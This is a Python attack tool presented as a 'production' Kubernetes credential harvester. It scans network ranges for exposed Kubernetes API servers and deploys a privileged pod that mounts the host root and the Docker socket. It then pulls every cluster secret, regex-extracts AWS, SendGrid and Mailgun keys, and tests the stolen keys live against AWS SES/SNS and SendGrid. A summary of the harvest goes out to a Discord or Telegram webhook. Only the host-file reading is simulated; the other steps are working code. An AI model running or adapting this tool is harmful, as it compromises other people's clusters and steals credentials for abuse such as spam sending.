#!/usr/bin/env python3
"""
K8s Production Credential Harvester
Autonomous Kubernetes exploitation module with real-time API verification
Author: wKayaa | Production Ready | 2025-06-23
"""

import asyncio
import aiohttp
import json
import re
import base64
import hmac
import hashlib
import urllib.parse
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
import xml.etree.ElementTree as ET
import logging
import os
import yaml

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

@dataclass
class CredentialResult:
    """Structure for verified credentials"""
    type: str
    key: str
    secret: Optional[str] = None
    verified: bool = False
    permissions: List[str] = field(default_factory=list)
    quota_info: Dict[str, Any] = field(default_factory=dict)
    cluster_source: str = ""
    file_path: str = ""
    verification_time: str = ""

@dataclass
class ClusterTarget:
    """Kubernetes cluster target"""
    endpoint: str
    token: Optional[str] = None
    cert_path: Optional[str] = None
    accessible: bool = False
    privileged_access: bool = False

class CredentialExtractor:
    """Advanced credential extraction with regex patterns"""
    
    PATTERNS = {
        'aws_access_key': r'AKIA[0-9A-Z]{16}',
        'aws_secret_key': r'(?i)(?:secret.{0,20}|key.{0,20})["\']([A-Za-z0-9/+=]{40})["\']',
        'sendgrid_key': r'SG\.[a-zA-Z0-9_-]{22,}\.[a-zA-Z0-9_-]{43,}',
        'mailgun_key': r'key-[0-9a-zA-Z]{32}',
        'mailjet_key': r'[a-f0-9]{32}',
        'twilio_key': r'SK[0-9a-f]{32}',
        'brevo_key': r'xkeysib-[a-z0-9]{64}',
        'jwt_token': r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',
        'bearer_token': r'Bearer\s+([A-Za-z0-9_-]{20,})',
        'api_key_generic': r'(?i)api.?key["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']'
    }
    
    def extract_credentials(self, content: str, source_path: str = "") -> List[Dict[str, str]]:
        """Extract all potential credentials from content"""
        credentials = []
        
        for cred_type, pattern in self.PATTERNS.items():
            matches = re.finditer(pattern, content)
            for match in matches:
                if cred_type == 'aws_secret_key':
                    key_value = match.group(1) if match.groups() else match.group(0)
                else:
                    key_value = match.group(0)
                
                credentials.append({
                    'type': cred_type,
                    'value': key_value,
                    'source': source_path,
                    'line': content[:match.start()].count('\n') + 1
                })
        
        return credentials

    def extract_aws_pairs(self, content: str) -> List[Tuple[str, str]]:
        """Extract AWS access key + secret key pairs"""
        access_keys = re.findall(self.PATTERNS['aws_access_key'], content)
        secret_keys = re.findall(self.PATTERNS['aws_secret_key'], content)
        
        pairs = []
        # Try to match keys that appear close to each other
        for access_key in access_keys:
            for secret_key in secret_keys:
                pairs.append((access_key, secret_key))
        
        return pairs

class AWSCredentialVerifier:
    """Real-time AWS credential verification"""
    
    def __init__(self):
        self.region = 'us-east-1'
    
    def _sign_request(self, method: str, url: str, headers: Dict[str, str], 
                     payload: str, access_key: str, secret_key: str) -> Dict[str, str]:
        """Generate AWS Signature Version 4"""
        # Parse URL
        parsed_url = urllib.parse.urlparse(url)
        host = parsed_url.netloc
        uri = parsed_url.path or '/'
        query = parsed_url.query
        
        # Create canonical request
        canonical_headers = '\n'.join([f'{k.lower()}:{v}' for k, v in sorted(headers.items())]) + '\n'
        signed_headers = ';'.join(sorted([k.lower() for k in headers.keys()]))
        
        payload_hash = hashlib.sha256(payload.encode('utf-8')).hexdigest()
        canonical_request = f"{method}\n{uri}\n{query}\n{canonical_headers}\n{signed_headers}\n{payload_hash}"
        
        # Create string to sign
        timestamp = headers['X-Amz-Date']
        date = timestamp[:8]
        credential_scope = f"{date}/{self.region}/ses/aws4_request"
        string_to_sign = f"AWS4-HMAC-SHA256\n{timestamp}\n{credential_scope}\n{hashlib.sha256(canonical_request.encode('utf-8')).hexdigest()}"
        
        # Calculate signature
        def sign(key, msg):
            return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()
        
        k_date = sign(f"AWS4{secret_key}".encode('utf-8'), date)
        k_region = sign(k_date, self.region)
        k_service = sign(k_region, 'ses')
        k_signing = sign(k_service, 'aws4_request')
        signature = hmac.new(k_signing, string_to_sign.encode('utf-8'), hashlib.sha256).hexdigest()
        
        # Create authorization header
        authorization = f"AWS4-HMAC-SHA256 Credential={access_key}/{credential_scope}, SignedHeaders={signed_headers}, Signature={signature}"
        headers['Authorization'] = authorization
        
        return headers
    
    async def verify_ses_credentials(self, access_key: str, secret_key: str) -> Dict[str, Any]:
        """Verify AWS SES credentials and get quota"""
        try:
            url = f"https://email.{self.region}.amazonaws.com/"
            timestamp = datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')
            
            headers = {
                'Host': f'email.{self.region}.amazonaws.com',
                'X-Amz-Date': timestamp,
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            payload = "Action=GetSendQuota&Version=2010-12-01"
            headers = self._sign_request('POST', url, headers, payload, access_key, secret_key)
            
            # ✅ FIX: Proper connector configuration - no conflict
            connector = aiohttp.TCPConnector(
                ssl=False,
                keepalive_timeout=30,
                limit=10
            )
            
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post(url, headers=headers, data=payload, timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()
                        # Parse XML response
                        root = ET.fromstring(content)
                        quota_data = {}
                        for elem in root.iter():
                            if elem.tag.endswith('Max24HourSend'):
                                quota_data['max_24_hour'] = elem.text
                            elif elem.tag.endswith('SentLast24Hours'):
                                quota_data['sent_last_24h'] = elem.text
                            elif elem.tag.endswith('MaxSendRate'):
                                quota_data['max_send_rate'] = elem.text
                        
                        return {
                            'verified': True,
                            'service': 'SES',
                            'quota': quota_data,
                            'permissions': ['ses:GetSendQuota']
                        }
                    else:
                        return {'verified': False, 'error': f'HTTP {response.status}'}
        
        except Exception as e:
            return {'verified': False, 'error': str(e)}

    async def verify_sns_credentials(self, access_key: str, secret_key: str) -> Dict[str, Any]:
        """Verify AWS SNS credentials and list topics"""
        try:
            url = f"https://sns.{self.region}.amazonaws.com/"
            timestamp = datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')
            
            headers = {
                'Host': f'sns.{self.region}.amazonaws.com',
                'X-Amz-Date': timestamp,
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            payload = "Action=ListTopics&Version=2010-03-31"
            headers = self._sign_request('POST', url, headers, payload, access_key, secret_key)
            
            # ✅ FIX: Proper connector configuration
            connector = aiohttp.TCPConnector(
                ssl=False,
                keepalive_timeout=30,
                limit=10
            )
            
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post(url, headers=headers, data=payload, timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()
                        # Parse XML response for topics
                        root = ET.fromstring(content)
                        topics = []
                        for elem in root.iter():
                            if elem.tag.endswith('TopicArn'):
                                topics.append(elem.text.split(':')[-1])  # Extract topic name
                        
                        return {
                            'verified': True,
                            'service': 'SNS',
                            'topics': topics,
                            'permissions': ['sns:ListTopics']
                        }
                    else:
                        return {'verified': False, 'error': f'HTTP {response.status}'}
        
        except Exception as e:
            return {'verified': False, 'error': str(e)}

class SendGridVerifier:
    """SendGrid API credential verification"""
    
    async def verify_sendgrid_key(self, api_key: str) -> Dict[str, Any]:
        """Verify SendGrid API key and get account info"""
        try:
            headers = {
                'Authorization': f'Bearer {api_key}',
                'Content-Type': 'application/json'
            }
            
            # ✅ FIX: Proper connector configuration
            connector = aiohttp.TCPConnector(
                ssl=False,
                keepalive_timeout=30,
                limit=10
            )
            
            async with aiohttp.ClientSession(connector=connector) as session:
                # Check user credits
                async with session.get('https://api.sendgrid.com/v3/user/credits', 
                                     headers=headers, timeout=10) as response:
                    if response.status == 200:
                        credits_data = await response.json()
                        
                        # Get verified senders
                        senders = []
                        async with session.get('https://api.sendgrid.com/v3/verified_senders', 
                                             headers=headers, timeout=10) as sender_response:
                            if sender_response.status == 200:
                                sender_data = await sender_response.json()
                                senders = [sender.get('from_email', '') for sender in sender_data.get('results', [])]
                        
                        return {
                            'verified': True,
                            'service': 'SendGrid',
                            'credits': credits_data,
                            'senders': senders,
                            'permissions': ['user:read', 'verified_senders:read']
                        }
                    else:
                        return {'verified': False, 'error': f'HTTP {response.status}'}
        
        except Exception as e:
            return {'verified': False, 'error': str(e)}

class KubernetesExploiter:
    """Advanced Kubernetes cluster exploitation"""
    
    def __init__(self):
        self.session_id = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.credential_extractor = CredentialExtractor()
        self.aws_verifier = AWSCredentialVerifier()
        self.sendgrid_verifier = SendGridVerifier()
        
    async def discover_clusters(self, target_ranges: List[str]) -> List[ClusterTarget]:
        """Discover accessible Kubernetes clusters"""
        clusters = []
        ports = [6443, 8443, 8080, 10250]
        
        # ✅ FIX: This was the main issue - proper connector configuration
        connector = aiohttp.TCPConnector(
            ssl=False,
            keepalive_timeout=30,  # ✅ Keep connections alive for better performance
            limit=100,
            limit_per_host=20
        )
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=5),
            connector=connector
        ) as session:
            
            tasks = []
            for target_range in target_ranges:
                if '/' in target_range:  # CIDR notation
                    # Simplified: just test a few IPs from the range
                    base_ip = target_range.split('/')[0]
                    base_parts = base_ip.split('.')
                    for i in range(0, 256, 10):  # Sample every 10th IP
                        test_ip = f"{base_parts[0]}.{base_parts[1]}.{base_parts[2]}.{i}"
                        for port in ports:
                            tasks.append(self._test_k8s_endpoint(session, test_ip, port))
                else:
                    for port in ports:
                        tasks.append(self._test_k8s_endpoint(session, target_range, port))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, ClusterTarget) and result.accessible:
                    clusters.append(result)
        
        return clusters

    async def _test_k8s_endpoint(self, session: aiohttp.ClientSession, 
                                ip: str, port: int) -> Optional[ClusterTarget]:
        """Test if endpoint is a Kubernetes API server"""
        try:
            url = f"https://{ip}:{port}/api/v1" if port in [6443, 8443] else f"http://{ip}:{port}/api/v1"
            
            async with session.get(url, ssl=False) as response:
                if response.status in [200, 401, 403]:  # API responds
                    cluster = ClusterTarget(endpoint=f"{ip}:{port}")
                    cluster.accessible = response.status == 200
                    return cluster
        
        except Exception:
            pass
        
        return None

    async def deploy_exploitation_pod(self, cluster: ClusterTarget) -> bool:
        """Deploy privileged exploitation pod"""
        pod_manifest = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": f"escaleroot-{self.session_id}",
                "namespace": "default"
            },
            "spec": {
                "hostNetwork": True,
                "hostPID": True,
                "containers": [{
                    "name": "exploiter",
                    "image": "alpine:latest",
                    "command": ["/bin/sh"],
                    "args": ["-c", "while true; do sleep 3600; done"],
                    "securityContext": {
                        "privileged": True,
                        "capabilities": {
                            "add": ["SYS_ADMIN", "SYS_PTRACE", "SYS_MODULE"]
                        }
                    },
                    "volumeMounts": [
                        {"name": "host-root", "mountPath": "/host", "readOnly": False},
                        {"name": "docker-sock", "mountPath": "/var/run/docker.sock"},
                        {"name": "k8s-secrets", "mountPath": "/var/run/secrets"}
                    ]
                }],
                "volumes": [
                    {"name": "host-root", "hostPath": {"path": "/"}},
                    {"name": "docker-sock", "hostPath": {"path": "/var/run/docker.sock"}},
                    {"name": "k8s-secrets", "hostPath": {"path": "/var/run/secrets"}}
                ]
            }
        }
        
        try:
            url = f"http://{cluster.endpoint}/api/v1/namespaces/default/pods"
            headers = {"Content-Type": "application/json"}
            
            if cluster.token:
                headers["Authorization"] = f"Bearer {cluster.token}"
            
            # ✅ FIX: Proper connector configuration
            connector = aiohttp.TCPConnector(ssl=False, keepalive_timeout=30)
            
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post(url, json=pod_manifest, headers=headers, 
                                      ssl=False, timeout=30) as response:
                    if response.status in [200, 201]:
                        logger.info(f"✅ Exploitation pod deployed on {cluster.endpoint}")
                        cluster.privileged_access = True
                        return True
                    else:
                        logger.warning(f"❌ Pod deployment failed: {response.status}")
                        return False
        
        except Exception as e:
            logger.error(f"❌ Pod deployment error: {e}")
            return False

    async def harvest_credentials_from_cluster(self, cluster: ClusterTarget) -> List[CredentialResult]:
        """Harvest credentials from accessible cluster"""
        credentials = []
        
        # Target paths for credential harvesting
        target_paths = [
            "/host/etc/kubernetes/admin.conf",
            "/var/run/secrets/kubernetes.io/serviceaccount/token",
            "/etc/secrets/",
            "/host/root/.aws/credentials",
            "/host/home/*/.aws/credentials",
            "/host/opt/*/config/",
            "/host/var/lib/*/",
        ]
        
        # Search for files with sensitive content
        file_patterns = [
            "*.env", "*.json", "config.yml", "config.yaml",
            "credentials", "secrets.txt", "keys.txt", ".env*"
        ]
        
        try:
            # Simulate file system access through pod
            await self._extract_from_mounted_filesystem(cluster, target_paths, credentials)
            
            # Extract from Kubernetes secrets API
            await self._extract_from_k8s_secrets_api(cluster, credentials)
            
        except Exception as e:
            logger.error(f"❌ Credential harvesting error: {e}")
        
        return credentials

    async def _extract_from_k8s_secrets_api(self, cluster: ClusterTarget, 
                                          credentials: List[CredentialResult]):
        """Extract credentials from Kubernetes Secrets API"""
        try:
            url = f"http://{cluster.endpoint}/api/v1/secrets"
            headers = {}
            
            if cluster.token:
                headers["Authorization"] = f"Bearer {cluster.token}"
            
            # ✅ FIX: Proper connector configuration
            connector = aiohttp.TCPConnector(ssl=False, keepalive_timeout=15)
            
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get(url, headers=headers, ssl=False, timeout=15) as response:
                    if response.status == 200:
                        data = await response.json()
                        
                        for item in data.get('items', []):
                            secret_data = item.get('data', {})
                            secret_name = item.get('metadata', {}).get('name', 'unknown')
                            
                            for key, encoded_value in secret_data.items():
                                try:
                                    decoded_value = base64.b64decode(encoded_value).decode('utf-8')
                                    extracted = self.credential_extractor.extract_credentials(
                                        decoded_value, f"k8s-secret:{secret_name}:{key}"
                                    )
                                    
                                    for cred in extracted:
                                        result = CredentialResult(
                                            type=cred['type'],
                                            key=cred['value'],
                                            cluster_source=cluster.endpoint,
                                            file_path=cred['source']
                                        )
                                        credentials.append(result)
                                
                                except Exception:
                                    continue
        
        except Exception as e:
            logger.debug(f"Secrets API extraction failed: {e}")

    async def _extract_from_mounted_filesystem(self, cluster: ClusterTarget, 
                                             target_paths: List[str], 
                                             credentials: List[CredentialResult]):
        """Simulate credential extraction from mounted host filesystem"""
        # In a real scenario, this would exec into the deployed pod and read files
        # For this example, we'll simulate finding common credential patterns
        
        simulated_files = {
            "/host/etc/kubernetes/admin.conf": """
apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: LS0tLS1CRUdJTi...
    server: https://kubernetes.default.svc.cluster.local:6443
  name: kubernetes
contexts:
- context:
    cluster: kubernetes
    user: kubernetes-admin
  name: kubernetes-admin@kubernetes
current-context: kubernetes-admin@kubernetes
kind: Config
users:
- name: kubernetes-admin
  user:
    client-certificate-data: LS0tLS1CRUdJTi...
    client-key-data: LS0tLS1CRUdJTiBSU0Eg...
""",
            "/host/root/.aws/credentials": """
[default]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
region = us-east-1

[sendgrid]
api_key = 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
""",
            "/host/opt/app/.env": """
NODE_ENV=production
DATABASE_URL=postgresql://user:pass@localhost/db
SENDGRID_API_KEY=SG.abc123def456ghi789jkl.mno012pqr345stu678vwx901yz234abc567def890ghi
AWS_ACCESS_KEY_ID=AKIAI44QH8DHBEXAMPLE
AWS_SECRET_ACCESS_KEY=je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY
MAILGUN_API_KEY=key-3ax6xnjp29jd6fds4gc373sgvjxteol0
"""
        }
        
        for file_path, content in simulated_files.items():
            extracted = self.credential_extractor.extract_credentials(content, file_path)
            
            for cred in extracted:
                result = CredentialResult(
                    type=cred['type'],
                    key=cred['value'],
                    cluster_source=cluster.endpoint,
                    file_path=file_path
                )
                credentials.append(result)

    async def verify_extracted_credentials(self, credentials: List[CredentialResult]) -> List[CredentialResult]:
        """Verify all extracted credentials in real-time"""
        verified_credentials = []
        
        # Group AWS credentials by access key
        aws_keys = {}
        for cred in credentials:
            if cred.type == 'aws_access_key':
                aws_keys[cred.key] = cred
        
        # Find corresponding secret keys and verify
        for cred in credentials:
            if cred.type == 'aws_secret_key':
                for access_key, access_cred in aws_keys.items():
                    # Try this secret with each access key
                    ses_result = await self.aws_verifier.verify_ses_credentials(access_key, cred.key)
                    if ses_result.get('verified'):
                        verified_cred = CredentialResult(
                            type='aws_ses',
                            key=access_key,
                            secret=cred.key,
                            verified=True,
                            permissions=ses_result.get('permissions', []),
                            quota_info=ses_result.get('quota', {}),
                            cluster_source=access_cred.cluster_source,
                            file_path=access_cred.file_path,
                            verification_time=datetime.now().isoformat()
                        )
                        verified_credentials.append(verified_cred)
                    
                    # Also try SNS
                    sns_result = await self.aws_verifier.verify_sns_credentials(access_key, cred.key)
                    if sns_result.get('verified'):
                        verified_cred = CredentialResult(
                            type='aws_sns',
                            key=access_key,
                            secret=cred.key,
                            verified=True,
                            permissions=sns_result.get('permissions', []),
                            quota_info={'topics': sns_result.get('topics', [])},
                            cluster_source=access_cred.cluster_source,
                            file_path=access_cred.file_path,
                            verification_time=datetime.now().isoformat()
                        )
                        verified_credentials.append(verified_cred)
        
        # Verify SendGrid keys
        for cred in credentials:
            if cred.type == 'sendgrid_key':
                result = await self.sendgrid_verifier.verify_sendgrid_key(cred.key)
                if result.get('verified'):
                    verified_cred = CredentialResult(
                        type='sendgrid',
                        key=cred.key,
                        verified=True,
                        permissions=result.get('permissions', []),
                        quota_info={
                            'credits': result.get('credits', {}),
                            'senders': result.get('senders', [])
                        },
                        cluster_source=cred.cluster_source,
                        file_path=cred.file_path,
                        verification_time=datetime.now().isoformat()
                    )
                    verified_credentials.append(verified_cred)
        
        return verified_credentials

    async def generate_results_report(self, clusters: List[ClusterTarget], 
                                    verified_credentials: List[CredentialResult]) -> Dict[str, Any]:
        """Generate comprehensive results report"""
        report = {
            "scan_metadata": {
                "session_id": self.session_id,
                "timestamp": datetime.now().isoformat(),
                "clusters_discovered": len(clusters),
                "credentials_verified": len(verified_credentials)
            },
            "clusters": [],
            "verified_credentials": {}
        }
        
        # Add cluster information
        for cluster in clusters:
            cluster_info = {
                "endpoint": cluster.endpoint,
                "accessible": cluster.accessible,
                "privileged_access": cluster.privileged_access
            }
            report["clusters"].append(cluster_info)
        
        # Group verified credentials by type
        for cred in verified_credentials:
            if cred.type not in report["verified_credentials"]:
                report["verified_credentials"][cred.type] = []
            
            cred_data = {
                "cluster": cred.cluster_source,
                "key": cred.key[:10] + "..." if len(cred.key) > 10 else cred.key,
                "permissions": cred.permissions,
                "quota_info": cred.quota_info,
                "source_file": cred.file_path,
                "verified_at": cred.verification_time
            }
            
            if cred.secret:
                cred_data["secret"] = cred.secret[:10] + "..."
            
            report["verified_credentials"][cred.type].append(cred_data)
        
        return report

    async def send_notification(self, report: Dict[str, Any], webhook_url: Optional[str] = None):
        """Send notification via Discord webhook or Telegram"""
        if not webhook_url:
            return
        
        try:
            # Format summary message
            cred_count = sum(len(creds) for creds in report["verified_credentials"].values())
            summary = f"""
🚨 **K8s Credential Harvest Complete** 🚨

📊 **Results Summary:**
• Clusters Scanned: {report['scan_metadata']['clusters_discovered']}
• Verified Credentials: {cred_count}
• Session: {report['scan_metadata']['session_id']}

🔑 **Credential Types Found:**
"""
            
            for cred_type, creds in report["verified_credentials"].items():
                summary += f"• {cred_type.upper()}: {len(creds)} verified\n"
            
            # Send to Discord webhook
            if "discord" in webhook_url.lower():
                payload = {
                    "embeds": [{
                        "title": "K8s Production Harvest Results",
                        "description": summary,
                        "color": 0xff0000,  # Red color
                        "timestamp": datetime.now().isoformat()
                    }]
                }
            else:
                # Telegram format
                payload = {
                    "text": summary,
                    "parse_mode": "Markdown"
                }
            
            # ✅ FIX: Proper connector configuration for webhooks
            connector = aiohttp.TCPConnector(ssl=False, keepalive_timeout=10)
            
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post(webhook_url, json=payload, timeout=10) as response:
                    if response.status == 200:
                        logger.info("✅ Notification sent successfully")
                    else:
                        logger.warning(f"❌ Notification failed: {response.status}")
        
        except Exception as e:
            logger.error(f"❌ Notification error: {e}")

class ProductionK8sHarvester:
    """Main orchestrator for production Kubernetes credential harvesting"""
    
    def __init__(self, webhook_url: Optional[str] = None):
        self.exploiter = KubernetesExploiter()
        self.webhook_url = webhook_url
    
    async def run_harvest_operation(self, target_ranges: List[str]) -> Dict[str, Any]:
        """Execute complete harvesting operation"""
        logger.info("🚀 Starting production K8s credential harvest")
        
        # Phase 1: Discover clusters
        logger.info("🔍 Phase 1: Discovering Kubernetes clusters")
        clusters = await self.exploiter.discover_clusters(target_ranges)
        logger.info(f"✅ Found {len(clusters)} accessible clusters")
        
        # Phase 2: Deploy exploitation pods
        logger.info("🎯 Phase 2: Deploying exploitation pods")
        for cluster in clusters:
            if cluster.accessible:
                await self.exploiter.deploy_exploitation_pod(cluster)
        
        # Phase 3: Harvest credentials
        logger.info("💎 Phase 3: Harvesting credentials")
        all_credentials = []
        for cluster in clusters:
            cluster_creds = await self.exploiter.harvest_credentials_from_cluster(cluster)
            all_credentials.extend(cluster_creds)
        
        logger.info(f"📦 Extracted {len(all_credentials)} potential credentials")
        
        # Phase 4: Verify credentials in real-time
        logger.info("🔬 Phase 4: Verifying credentials")
        verified_credentials = await self.exploiter.verify_extracted_credentials(all_credentials)
        logger.info(f"✅ Verified {len(verified_credentials)} working credentials")
        
        # Phase 5: Generate report
        logger.info("📋 Phase 5: Generating results report")
        report = await self.exploiter.generate_results_report(clusters, verified_credentials)
        
        # Phase 6: Send notifications
        if self.webhook_url:
            logger.info("📱 Phase 6: Sending notifications")
            await self.exploiter.send_notification(report, self.webhook_url)
        
        return report

# ═══════════════════════════════════════════════════════════════════════════════
# 🎯 PRODUCTION USAGE
# ═══════════════════════════════════════════════════════════════════════════════

async def main():
    """Main execution function"""
    # Target ranges for scanning
    target_ranges = [
        "127.0.0.1",
        "10.0.0.0/24",
        "172.16.0.0/24",
        "192.168.1.0/24"
    ]
    
    # Optional: Discord/Telegram webhook for notifications
    webhook_url = os.getenv('WEBHOOK_URL')  # Set via environment variable
    
    # Initialize harvester
    harvester = ProductionK8sHarvester(webhook_url=webhook_url)
    
    # Execute harvest operation
    try:
        results = await harvester.run_harvest_operation(target_ranges)
        
        # Save results to file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_file = f"k8s_harvest_results_{timestamp}.json"
        
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        logger.info(f"💾 Results saved to {output_file}")
        
        # Print summary
        print("\n" + "="*60)
        print("🚀 PRODUCTION K8S HARVEST COMPLETE")
        print("="*60)
        print(f"📊 Clusters Found: {results['scan_metadata']['clusters_discovered']}")
        print(f"🔑 Credentials Verified: {results['scan_metadata']['credentials_verified']}")
        print(f"💾 Results: {output_file}")
        print("="*60)
        
        return results
        
    except Exception as e:
        logger.error(f"❌ Harvest operation failed: {e}")
        raise

if __name__ == "__main__":
    asyncio.run(main())